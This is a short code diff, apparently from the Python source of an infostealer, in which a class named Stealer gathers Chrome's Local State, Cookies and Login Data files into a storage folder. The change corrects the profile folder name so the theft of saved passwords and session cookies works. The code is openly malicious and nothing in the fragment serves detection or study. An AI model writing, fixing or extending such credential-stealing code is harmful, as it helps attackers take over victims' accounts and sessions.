@@ -30,8 +30,8 @@ class Stealer(Thread):
                     self.storage_path,
                     self.storage_folder,
                     rf"{environ['USERPROFILE']}{sep}AppData\Local\Google\Chrome\User Data\Local State",
-                    rf"{environ['USERPROFILE']}{sep}AppData\Local\Google\Chrome\User Data\default\Cookies",
-                    rf"{environ['USERPROFILE']}{sep}AppData\Local\Google\Chrome\User Data\default\Login Data",
+                    rf"{environ['USERPROFILE']}{sep}AppData\Local\Google\Chrome\User Data\Default\Cookies",
+                    rf"{environ['USERPROFILE']}{sep}AppData\Local\Google\Chrome\User Data\Default\Login Data",
                     self.errors
                 )
             },
